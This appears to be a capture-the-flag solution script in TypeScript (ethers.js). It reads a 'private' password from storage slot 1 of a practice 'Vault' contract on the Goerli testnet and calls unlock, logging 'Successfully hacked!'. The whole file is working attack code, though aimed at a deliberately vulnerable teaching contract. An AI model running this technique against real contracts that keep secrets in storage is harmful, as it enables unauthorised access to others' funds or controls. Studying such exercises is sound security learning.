import { ethers } from "ethers";
import { Vault__factory } from '../typechain-types';

// Task: get value of private variable

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const contract = Vault__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    const password = await provider.getStorage(instanceAddress, 1)

    tx = await contract.connect(signer).unlock(password);
    await tx.wait();

    const locked = await contract.locked();

    console.log("Successfully hacked!");
    console.log("Vault is unlocked:", !locked);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});